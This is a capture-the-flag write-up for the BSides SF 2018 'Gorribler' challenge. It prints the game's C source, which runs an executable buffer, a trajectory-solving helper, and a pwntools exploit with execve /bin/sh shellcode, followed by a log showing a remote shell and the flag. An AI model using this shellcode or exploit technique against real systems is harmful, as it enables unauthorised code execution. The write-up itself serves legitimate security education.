---
title: "BSides SF CTF 2018 - Gorribler (Pwn)"
header:
  overlay_image: /assets/images/bsidessf2018/gorribler/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Jordan McDonald on Unsplash"

tags:
  - bsidessf2018
  - writeup
  - pwn
---

Execute arbitrary shellcode by writing to the buffer by calculating values that
provide the right values when simulating a projectile's trajectory.

## Challenge Description

```
Build some shellcode using the game, and read /home/ctf/flag.txt!

nc -v goribbler-7ced25.challenges.bsidessf.net 1338
```

#### Points

Points: 666

Solves: 7

## Solution

We are given the following source code:

```c
#include <math.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>

#define disable_buffering(_fd) setvbuf(_fd, NULL, _IONBF, 0)
#define clear() printf("\033[H\033[J")

#define BOARD_WIDTH 136
#define BOARD_HEIGHT 64
#define PRIZE_COUNT 16

#define CODE_LENGTH 1024

#define MAX_WIND 200
#define GRAVITY (-9.8)
#define SCALE (5000 / 80)
#define TIME_SCALE (0.4)

typedef enum {
  SCORE_LEFT,
  SCORE_RIGHT
} score_state_t;

static int delay = 50000;

#define RAD(x) (x*3.1415926/180)
void draw_board(double wind, uint8_t board[BOARD_WIDTH][BOARD_HEIGHT], uint8_t prizes[PRIZE_COUNT]) {
  ssize_t i, j;

  clear();

  printf("Wind: %f\n\n", wind);

  for(i = 0; i < BOARD_HEIGHT; i++) {
    printf("    |");
    for(j = 0; j < BOARD_WIDTH; j++) {
      printf("%c", board[j][i] ? 'o' : ' ');
    }
    printf("\n");
  }

  printf("    |");
  for(j = 0; j < BOARD_WIDTH; j++) {
    printf("-");
  }
  printf("\n");

  printf("    |");
  printf("  YOU  |");
  for(j = 0; j < (BOARD_WIDTH / 8) - 1; j++) {
    printf("   %x   |", prizes[j]);
  }
  printf("\n");
}

void clear_board(uint8_t board[BOARD_WIDTH][BOARD_HEIGHT]) {
  ssize_t i, j;

  for(i = 0; i < BOARD_HEIGHT; i++) {
    for(j = 0; j < BOARD_WIDTH; j++) {
      board[j][i] = 0;
    }
  }
}

void swap(uint8_t *a, uint8_t *b) {
  uint8_t c = *a;
  *a = *b;
  *b = c;
}

void shuffle_prizes(uint8_t prizes[PRIZE_COUNT]) {
  ssize_t i;

  for(i = 0; i < PRIZE_COUNT; i++) {
    swap(&prizes[i], &prizes[rand() % PRIZE_COUNT]);
  }
}

double get_wind() {
  return (double)((rand() % (MAX_WIND * 2)) - MAX_WIND);
}

double prompt(char *str, double min, double max) {
  for(;;) {
    char in[16];
    double result;

    printf("%s", str);
    fgets(in, 15, stdin);
    in[15] = 0;

    result = atoi(in);
    if(result >= min && result <= max) {
      return result;
    }

    printf("Please choose a value between %f and %f!\n", min, max);
    printf("\n");
  }
}

int8_t shoot(uint8_t board[BOARD_WIDTH][BOARD_HEIGHT], double wind, uint8_t prizes[PRIZE_COUNT], double power, double angle) {
  double v0_v = sin(RAD(angle)) * power;
  double v0_h = cos(RAD(angle)) * power;

  printf("Initial velocity (v) = %f, (h) = %f\n", v0_v, v0_h);

  double t;

  for(t = 0; t < 10000; t += TIME_SCALE) {
    double p_v = (((0.5 * pow(t, 2) * GRAVITY) + (t * v0_v)) / SCALE);
    double p_h = (((0.5 * pow(t, 2) * (wind / 50)) + (t * v0_h)) / SCALE) + 4;

    if(p_v < 0) {
      int result = ((int) p_h / 8) - 1;
      if(result < 0 || result >= PRIZE_COUNT) {
        return -1;
      }
      return prizes[result];
    }

    if(p_v > 0 && p_v < BOARD_HEIGHT) {
      if(p_h > 0 && p_h < BOARD_WIDTH) {
        board[(int)p_h][BOARD_HEIGHT - (int)p_v - 1] = 1;
      }
    }
    draw_board(wind, board, prizes);

    usleep(delay);
  }

  return -1;
}

int main(int argc, char *argv[]) {
  ssize_t i;
  uint8_t *scores = mmap(NULL, CODE_LENGTH, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
  ssize_t score_position = 0;
  score_state_t score_state = SCORE_LEFT;
  srand(time(NULL));

  disable_buffering(stdin);
  disable_buffering(stdout);
  disable_buffering(stderr);

  for(;;) {
    uint8_t board[BOARD_WIDTH][BOARD_HEIGHT];
    uint8_t prizes[PRIZE_COUNT] = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 };
    double wind = get_wind();

    clear_board(board);
    shuffle_prizes(prizes);
    draw_board(wind, board, prizes);

    /* TODO: Display score */
    printf("Your current program:\n");
    for(i = 0; i < score_position; i++) {
      printf("%x ", scores[i]);
    }
    if(score_state == SCORE_RIGHT) {
      printf("%x?", scores[score_position] >> 4);
    }
    printf("\n");
    double power = prompt("Power (0-1000) --> ", 0, 1000);
    double angle = prompt("Angle (0-360) --> ", 0, 360);

    int8_t result = shoot(board, wind, prizes, power, angle);
    if(result < 0) {
      printf("You missed! Time to run the code you've built!\n");
      printf("\n");
      break;
    }

    if(score_state == SCORE_LEFT) {
      scores[score_position] = (result & 0x0F) << 4;
      score_state = SCORE_RIGHT;
    } else {
      scores[score_position] |= result & 0x0F;
      score_state = SCORE_LEFT;
      score_position++;
    }

    printf("Congratulations! You hit the nibble %x!\n", result);
    printf("Added to the code! Miss a shot to run!\n");
    printf("\n");
    printf("<press enter>\n");
    getchar();
  }

  alarm(60);

  asm("call *%0\n" : :"r"(scores));

  return 0;
}
```

When running it, we are given a prompt to supply a 'power' and an 'angle'
value.

```
Your current program:

Power (0-1000) --> 250
Angle (0-360) --> 50
Initial velocity (v) = 191.511108, (h) = 160.696905
Wind: 18.000000
```

Once we have supplied these two values, the binary will simulate the trajectory
of a projectile and draw a parabola. The value at which the projectile lands
represents a nibble which is added to the current buffer.

![1]({{ site.url }}{{ site.baseurl }}/assets/images/bsidessf2018/gorribler/parabola.png){: .align-center}

The objective is to make the right shots to build our shellcode in memory
before making a bad shot to execute it. To give us the right values for power
and angle given the wind conditions, we can leverage the original code and do a
search beginning at 200 power and 50 angle. We can use this value because there
are no bad shots at any wind value within the valid range. Once we have an
initial starting result, we can just adjust power to get the desired value.

```c
#include <math.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>

#define disable_buffering(_fd) setvbuf(_fd, NULL, _IONBF, 0)
#define clear() printf("\033[H\033[J")

#define BOARD_WIDTH 136
#define BOARD_HEIGHT 64
#define PRIZE_COUNT 16

#define CODE_LENGTH 1024

#define MAX_WIND 200
#define GRAVITY (-9.8)
#define SCALE (5000 / 80)
#define TIME_SCALE (0.4)

#define RAD(x) (x*3.1415926/180)

void swap(uint8_t *a, uint8_t *b) {
    uint8_t c = *a;
    *a = *b;
    *b = c;
}

int8_t predict(double wind, double power, double angle) {
    double v0_v = sin(RAD(angle)) * power;
    double v0_h = cos(RAD(angle)) * power;

    //printf("Wind = %f, Power = %f, Angle = %f\n", wind, power, angle);
    //printf("Initial velocity (v) = %f, (h) = %f\n", v0_v, v0_h);

    double t;

    for(t = 0; t < 10000; t += TIME_SCALE) {
        double p_v = (((0.5 * pow(t, 2) * GRAVITY) + (t * v0_v)) / SCALE);
        double p_h = (((0.5 * pow(t, 2) * (wind / 50)) + (t * v0_h)) / SCALE) + 4;

        if(p_v < 0) {
            int result = ((int) p_h / 8) - 1;
            if(result < 0 || result >= PRIZE_COUNT) {
                return -1;
            }
            return result;
        }

    }

    return -1;
}


int main(int argc, char *argv[]) {
    double wind, power, angle;
    int desire;
    int8_t result;
    sscanf(argv[1], "%d", &desire);
    sscanf(argv[2], "%lf", &wind);
    power = 200;
    angle = 50;
    result = 17;

    while (result != desire) {
        result = predict(wind, power, angle);
        if (result > desire) {
            power -= 5;
        }
        if (result < desire) {
            power += 5;
        }
    }

    printf("(%f,%f)", power, angle);

    return 0;
}
```

An example execution that looks for the right power and angle values given the
wind condition 57.3 for the result 12:

```shell
$ ./predict 12 57.3
(235.000000,50.000000)
```

The final exploit:

```python
from pwn import *
import math
import numpy as np
import subprocess

#context.log_level = "debug"

BOARD_WIDTH = 136
BOARD_HEIGHT = 64
PRIZE_COUNT = 16

CODE_LENGTH = 1024
MAX_WIND = 200
GRAVITY = -9.8
SCALE = 5000 / 80
TIME_SCALE = 0.4

shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
shellcode = shellcode.encode("hex")

def predict(desired, wind):
    result = subprocess.check_output(["./predict", str(desired), str(wind)])
    return safeeval.expr(result)

def main():
    #p = process("goribble")
    p = remote("goribbler-7ced25.challenges.bsidessf.net", 1338)

    for i in shellcode:
        p.recvuntil("Wind: ")
        wind = float(p.recvline().strip())
        p.recvuntil("YOU  |")
        prizes_line = p.recvline().strip().replace(" ", "").replace("|", "")
        prizes = list(prizes_line)
        log.info("Wind: %f | Prizes: %s", wind, prizes)
        desired = prizes.index(i)
        power, angle = predict(desired, wind)
        p.recvuntil("Power (0-1000) -->")
        p.sendline(str(power))
        p.recvuntil("Angle (0-360) -->")
        p.sendline(str(angle))
        log.info("Writing %s with Power %f and Angle %f for Prize %d..." %
                (i, power, angle, desired))
        p.recvuntil("<press enter>")
        p.sendline("")
        log.info("Entering next nibble.")

    log.info("Triggering shellcode execution.")
    p.sendline("0")
    p.sendline("0")
    p.recvrepeat(0.2)

    log.success("Enjoy your shell.")
    p.interactive()

if __name__ == "__main__":
    main()
```

Running it:

```shell
$ python exploit.py
[+] Opening connection to goribbler-7ced25.challenges.bsidessf.net on port 1338: Done
[*] Wind: -168.000000 | Prizes: ['8', 'd', '2', '0', '7', '9', 'a', 'c', '6', '1', 'f', '4', 'e', '5', 'b', '3']
[*] Writing 6 with Power 270.000000 and Angle 50.000000 for Prize 8...
[*] Entering next nibble.
[*] Wind: -125.000000 | Prizes: ['3', '4', '7', '5', '8', 'e', '0', '6', 'b', '9', 'a', 'c', 'f', 'd', '1', '2']
[*] Writing a with Power 275.000000 and Angle 50.000000 for Prize 10...
[*] Entering next nibble.
[*] Wind: -144.000000 | Prizes: ['d', 'f', '3', '1', '4', 'e', '8', 'b', '6', 'a', '5', '0', 'c', '9', '2', '7']
[*] Writing 0 with Power 300.000000 and Angle 50.000000 for Prize 11...
[*] Entering next nibble.
[*] Wind: -10.000000 | Prizes: ['4', 'd', 'e', '8', '3', '2', '6', 'a', '1', 'c', '5', '7', '0', '9', 'f', 'b']
[*] Writing b with Power 280.000000 and Angle 50.000000 for Prize 15...
[*] Entering next nibble.
[*] Wind: 13.000000 | Prizes: ['e', '3', '7', '0', '9', 'd', 'a', 'c', '5', 'f', '8', '6', 'b', '4', '1', '2']
[*] Writing 5 with Power 205.000000 and Angle 50.000000 for Prize 8...
[*] Entering next nibble.
[*] Wind: -117.000000 | Prizes: ['a', '0', '7', 'e', '1', '5', '6', '3', '9', 'd', 'c', '4', '8', '2', 'b', 'f']
[*] Writing 8 with Power 295.000000 and Angle 50.000000 for Prize 12...
[*] Entering next nibble.
[*] Wind: -27.000000 | Prizes: ['9', '5', '4', '0', '3', '2', 'a', '8', 'b', 'e', 'd', '7', 'c', '1', '6', 'f']
[*] Writing 9 with Power 85.000000 and Angle 50.000000 for Prize 0...
[*] Entering next nibble.
[*] Wind: 109.000000 | Prizes: ['1', 'c', '3', 'a', '0', 'd', '5', '4', '8', 'b', 'e', 'f', '9', '7', '6', '2']
[*] Writing 9 with Power 225.000000 and Angle 50.000000 for Prize 12...
[*] Entering next nibble.
[*] Wind: 51.000000 | Prizes: ['4', '1', '2', '0', 'b', 'd', '6', '8', '7', 'a', '3', 'c', '9', 'f', '5', 'e']
[*] Writing 5 with Power 255.000000 and Angle 50.000000 for Prize 14...
[*] Entering next nibble.
[*] Wind: -15.000000 | Prizes: ['e', '2', '9', 'b', '1', '3', '6', '5', '7', 'a', 'f', '0', 'c', '8', '4', 'd']
[*] Writing 2 with Power 110.000000 and Angle 50.000000 for Prize 1...
[*] Entering next nibble.
[*] Wind: -14.000000 | Prizes: ['0', '5', '7', '9', 'e', '3', 'f', '2', '6', 'd', 'c', 'b', '4', '1', '8', 'a']
[*] Writing 6 with Power 210.000000 and Angle 50.000000 for Prize 8...
[*] Entering next nibble.
[*] Wind: 169.000000 | Prizes: ['8', '6', '9', 'e', 'a', '0', '1', 'b', '2', '4', '3', '5', 'f', '7', 'd', 'c']
[*] Writing 8 with Power 70.000000 and Angle 50.000000 for Prize 0...
[*] Entering next nibble.
[*] Wind: 126.000000 | Prizes: ['c', '0', '9', '3', '8', '2', '4', 'a', '1', '6', '7', 'd', 'e', 'b', 'f', '5']
[*] Writing 2 with Power 155.000000 and Angle 50.000000 for Prize 5...
[*] Entering next nibble.
[*] Wind: 143.000000 | Prizes: ['1', 'd', 'f', '7', '3', '6', '2', '0', '5', '8', 'b', 'c', '4', '9', 'a', 'e']
[*] Writing f with Power 110.000000 and Angle 50.000000 for Prize 2...
[*] Entering next nibble.
[*] Wind: -80.000000 | Prizes: ['5', '6', '1', 'c', '8', '4', 'd', '3', '0', 'e', 'a', 'f', '2', 'b', '9', '7']
[*] Writing 2 with Power 280.000000 and Angle 50.000000 for Prize 12...
[*] Entering next nibble.
[*] Wind: -7.000000 | Prizes: ['9', '6', '5', 'a', '3', 'e', '0', '7', 'b', '2', '8', 'c', 'f', 'd', '4', '1']
[*] Writing f with Power 255.000000 and Angle 50.000000 for Prize 12...
[*] Entering next nibble.
[*] Wind: 106.000000 | Prizes: ['2', 'e', '1', '7', '3', '0', 'f', '6', 'a', 'b', '8', '5', '9', 'd', 'c', '4']
[*] Writing 7 with Power 130.000000 and Angle 50.000000 for Prize 3...
[*] Entering next nibble.
[*] Wind: -3.000000 | Prizes: ['8', 'a', '6', '9', '0', 'b', 'c', '3', '7', '5', 'd', '4', '2', 'f', '1', 'e']
[*] Writing 3 with Power 200.000000 and Angle 50.000000 for Prize 7...
[*] Entering next nibble.
[*] Wind: 83.000000 | Prizes: ['9', '8', 'c', '3', '0', '6', 'a', 'f', '1', '4', 'd', 'e', '7', 'b', '2', '5']
[*] Writing 6 with Power 160.000000 and Angle 50.000000 for Prize 5...
[*] Entering next nibble.
[*] Wind: 6.000000 | Prizes: ['6', '3', 'f', 'b', '7', '2', 'a', '9', '0', '1', 'c', '4', 'e', '5', '8', 'd']
[*] Writing 8 with Power 270.000000 and Angle 50.000000 for Prize 14...
[*] Entering next nibble.
[*] Wind: 69.000000 | Prizes: ['2', '7', '6', '5', 'c', 'e', '9', '8', '3', 'b', '1', '4', 'f', '0', 'a', 'd']
[*] Writing 6 with Power 120.000000 and Angle 50.000000 for Prize 2...
[*] Entering next nibble.
[*] Wind: 36.000000 | Prizes: ['f', 'b', '5', 'c', '2', '4', '3', '7', 'a', '6', 'e', '0', 'd', '1', '8', '9']
[*] Writing 8 with Power 260.000000 and Angle 50.000000 for Prize 14...
[*] Entering next nibble.
[*] Wind: -194.000000 | Prizes: ['2', '1', 'f', '4', 'e', '7', '8', 'a', '9', '5', 'b', '3', '0', 'd', 'c', '6']
[*] Writing 2 with Power 115.000000 and Angle 50.000000 for Prize 0...
[*] Entering next nibble.
[*] Wind: -40.000000 | Prizes: ['0', '1', 'e', '7', '3', 'a', '9', 'f', '6', 'c', 'b', '5', 'd', '4', '2', '8']
[*] Writing f with Power 205.000000 and Angle 50.000000 for Prize 7...
[*] Entering next nibble.
[*] Wind: 108.000000 | Prizes: ['5', '8', '4', 'e', '7', 'c', '0', '1', 'f', 'd', '2', '9', '6', 'a', 'b', '3']
[*] Writing 6 with Power 225.000000 and Angle 50.000000 for Prize 12...
[*] Entering next nibble.
[*] Wind: -60.000000 | Prizes: ['0', 'd', '9', '2', '1', '3', 'b', '8', 'c', '5', 'e', 'f', '4', '7', 'a', '6']
[*] Writing 2 with Power 160.000000 and Angle 50.000000 for Prize 3...
[*] Entering next nibble.
[*] Wind: 63.000000 | Prizes: ['a', '8', 'd', 'c', '9', '4', 'f', 'b', '6', '7', '2', '1', 'e', '0', '5', '3']
[*] Writing 6 with Power 200.000000 and Angle 50.000000 for Prize 8...
[*] Entering next nibble.
[*] Wind: 102.000000 | Prizes: ['4', '5', '6', '0', '8', '2', '7', '1', 'a', 'c', 'e', '3', 'd', 'f', 'b', '9']
[*] Writing 9 with Power 250.000000 and Angle 50.000000 for Prize 15...
[*] Entering next nibble.
[*] Wind: -75.000000 | Prizes: ['6', '2', 'f', '5', '1', 'e', '9', 'a', '7', 'c', '0', '8', 'd', 'b', '4', '3']
[*] Writing 6 with Power 90.000000 and Angle 50.000000 for Prize 0...
[*] Entering next nibble.
[*] Wind: 165.000000 | Prizes: ['4', 'e', '5', '7', 'a', 'd', '3', '9', '1', 'f', '0', '2', 'b', '6', '8', 'c']
[*] Writing e with Power 90.000000 and Angle 50.000000 for Prize 1...
[*] Entering next nibble.
[*] Wind: -136.000000 | Prizes: ['8', '4', 'd', '6', 'c', 'b', '9', '2', '3', 'f', '1', 'e', '7', '0', '5', 'a']
[*] Writing 8 with Power 100.000000 and Angle 50.000000 for Prize 0...
[*] Entering next nibble.
[*] Wind: -134.000000 | Prizes: ['7', '3', 'e', 'c', '8', 'b', '9', '6', '0', '4', '5', 'd', '2', '1', 'f', 'a']
[*] Writing 9 with Power 220.000000 and Angle 50.000000 for Prize 6...
[*] Entering next nibble.
[*] Wind: -101.000000 | Prizes: ['3', '1', 'e', '4', '8', '2', '9', 'b', '5', 'd', 'f', 'a', 'c', '6', '7', '0']
[*] Writing e with Power 150.000000 and Angle 50.000000 for Prize 2...
[*] Entering next nibble.
[*] Wind: 87.000000 | Prizes: ['a', 'e', 'f', '7', '1', 'b', '2', '9', '8', 'd', '3', 'c', '5', '4', '6', '0']
[*] Writing 3 with Power 210.000000 and Angle 50.000000 for Prize 10...
[*] Entering next nibble.
[*] Wind: -83.000000 | Prizes: ['3', '5', '0', '7', '2', 'c', '8', 'd', '1', 'a', 'e', '4', '6', '9', 'f', 'b']
[*] Writing 3 with Power 95.000000 and Angle 50.000000 for Prize 0...
[*] Entering next nibble.
[*] Wind: 158.000000 | Prizes: ['f', '2', 'b', 'e', '1', '8', 'c', '4', '6', '9', '7', 'd', 'a', '0', '5', '3']
[*] Writing 1 with Power 135.000000 and Angle 50.000000 for Prize 4...
[*] Entering next nibble.
[*] Wind: -83.000000 | Prizes: ['d', '5', '4', '8', '0', 'a', '9', '6', '3', '7', '1', 'f', '2', 'c', 'e', 'b']
[*] Writing c with Power 290.000000 and Angle 50.000000 for Prize 13...
[*] Entering next nibble.
[*] Wind: 90.000000 | Prizes: ['4', '1', '0', '9', '8', 'd', 'a', 'e', '3', '6', 'c', '2', '5', 'b', 'f', '7']
[*] Writing 9 with Power 130.000000 and Angle 50.000000 for Prize 3...
[*] Entering next nibble.
[*] Wind: -130.000000 | Prizes: ['1', 'b', '6', '3', 'a', '9', 'c', '8', '7', '2', '5', '0', 'd', '4', 'f', 'e']
[*] Writing c with Power 220.000000 and Angle 50.000000 for Prize 6...
[*] Entering next nibble.
[*] Wind: -7.000000 | Prizes: ['5', 'c', '1', '0', '2', 'e', '9', '3', '7', '8', '4', 'a', 'b', 'f', '6', 'd']
[*] Writing d with Power 280.000000 and Angle 50.000000 for Prize 15...
[*] Entering next nibble.
[*] Wind: 96.000000 | Prizes: ['0', '7', 'c', 'e', '4', 'f', '5', 'a', '1', '2', '9', '6', '3', 'd', 'b', '8']
[*] Writing 8 with Power 250.000000 and Angle 50.000000 for Prize 15...
[*] Entering next nibble.
[*] Wind: -70.000000 | Prizes: ['c', 'e', '5', '0', '6', 'b', 'f', '1', 'a', '3', '4', '9', 'd', '7', '2', '8']
[*] Writing 0 with Power 160.000000 and Angle 50.000000 for Prize 3...
[*] Entering next nibble.
[*] Triggering shellcode execution.
[+] Enjoy your shell.
[*] Switching to interactive mode
$ ls -la
total 80
drwxr-xr-x   1 root root 4096 Apr 16 13:01 .
drwxr-xr-x   1 root root 4096 Apr 16 13:01 ..
-rwxr-xr-x   1 root root    0 Apr 16 13:01 .dockerenv
drwxr-xr-x   2 root root 4096 Apr 16 13:01 bin
drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
drwxr-xr-x   5 root root  360 Apr 16 13:01 dev
drwxr-xr-x   1 root root 4096 Apr 16 13:01 etc
drwxr-xr-x   3 root root 4096 Apr 16 13:01 home
drwxr-xr-x   9 root root 4096 Apr 16 13:01 lib
drwxr-xr-x   2 root root 4096 Apr 16 13:01 lib32
drwxr-xr-x   2 root root 4096 Apr 16 13:01 lib64
drwxr-xr-x   2 root root 4096 Apr 16 13:01 libx32
drwxr-xr-x   2 root root 4096 Jan 19  2017 media
drwxr-xr-x   2 root root 4096 Jan 19  2017 mnt
drwxr-xr-x   2 root root 4096 Jan 19  2017 opt
dr-xr-xr-x 165 root root    0 Apr 16 13:01 proc
drwx------   2 root root 4096 Apr 16 13:01 root
drwxr-xr-x   1 root root 4096 Apr 16 13:01 run
drwxr-xr-x   2 root root 4096 Apr 16 13:01 sbin
drwxr-xr-x   2 root root 4096 Jan 19  2017 srv
dr-xr-xr-x  12 root root    0 Apr 16 16:25 sys
drwxrwxrwt   2 root root 4096 Jan 19  2017 tmp
drwxr-xr-x  12 root root 4096 Apr 16 13:01 usr
drwxr-xr-x  11 root root 4096 Apr 16 13:01 var
$ cd home/ctf
$ ls -la
total 56
drwxr-xr-x 2 root root  4096 Apr 16 13:01 .
drwxr-xr-x 3 root root  4096 Apr 16 13:01 ..
-rw-r--r-- 3 root root   220 Feb 11  2017 .bash_logout
-rw-r--r-- 3 root root  3771 Feb 11  2017 .bashrc
-rw-r--r-- 3 root root   655 Feb 11  2017 .profile
-rw-r--r-- 2 root root   184 Apr 15 13:58 Makefile
-rw-r--r-- 2 root root    16 Apr 15 13:58 flag.txt
-rwxr-xr-x 4 root root 12284 Apr 16 12:38 goribble
-rw-r--r-- 2 root root  4597 Apr 15 13:58 goribble.c
-rw-r--r-- 4 root root  5212 Apr 16 12:38 goribble.o
$ cat flag.txt
FLAG:3da3db856f
$
```

Flag: **FLAG:3da3db856f**

